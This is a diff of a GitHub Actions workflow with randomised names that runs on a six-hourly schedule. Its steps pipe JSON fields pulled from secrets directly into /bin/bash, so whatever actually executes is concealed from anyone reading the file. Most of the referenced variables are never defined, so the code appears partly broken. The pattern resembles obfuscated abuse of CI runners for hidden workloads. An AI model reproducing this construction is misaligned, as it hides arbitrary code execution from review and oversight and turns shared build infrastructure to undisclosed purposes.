@@ -3,20 +3,31 @@ name: yangzhengdao3645
 on:
   workflow_dispatch:
   schedule:
-    - cron: '16 5/6 * * *'
-jobs:  # 25001
+    - cron: '8 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: yangzhengdao3645
         env:
-          ozsxq8698: ${{ secrets.ozsxq8698 }}
+          ltg85: ${{ secrets.ltg85 }}
         run: |
-          echo $ozsxq8698 | jq -r .msb9846 | /bin/bash
-          echo $yrny8067 | jq -r .bhqr73580 | /bin/bash
-          echo $bjo8 | jq -r .r081 | /bin/bash
-          echo $pph2107 | jq -r .xths0289 | /bin/bash
-          echo $ive385 | jq -r .feqgj50336 | /bin/bash
-          echo $c0185 | jq -r .ehmre44301 | /bin/bash
+          echo $ltg85 | jq -r .xa2 | /bin/bash
+          echo $ctow386 | jq -r .cs7 | /bin/bash
+          echo $nuh0 | jq -r .yvdrg215 | /bin/bash
+          echo $ddzn81 | jq -r .p98 | /bin/bash
+          echo $sr79200 | jq -r .tpz5 | /bin/bash
+          echo $nuwd4 | jq -r .gu40243 | /bin/bash
+          echo $sadzw06 | jq -r .itgxl0558 | /bin/bash
+          echo $rhfov554 | jq -r .bbh440 | /bin/bash
+          echo $ft14866 | jq -r .us575 | /bin/bash
+          echo $i49 | jq -r .eor05264 | /bin/bash
+          echo $fy53 | jq -r .lhr32 | /bin/bash
+          echo $tqkdl99681 | jq -r .xsvl99 | /bin/bash
+          echo $b93694 | jq -r .next441 | /bin/bash
+          echo $xo70 | jq -r .vfdrg95058 | /bin/bash
+          echo $hbq409 | jq -r .bwgs78 | /bin/bash
+          echo $sf71181 | jq -r .w18 | /bin/bash
+          echo $qqed8735 | jq -r .wr6 | /bin/bash
 
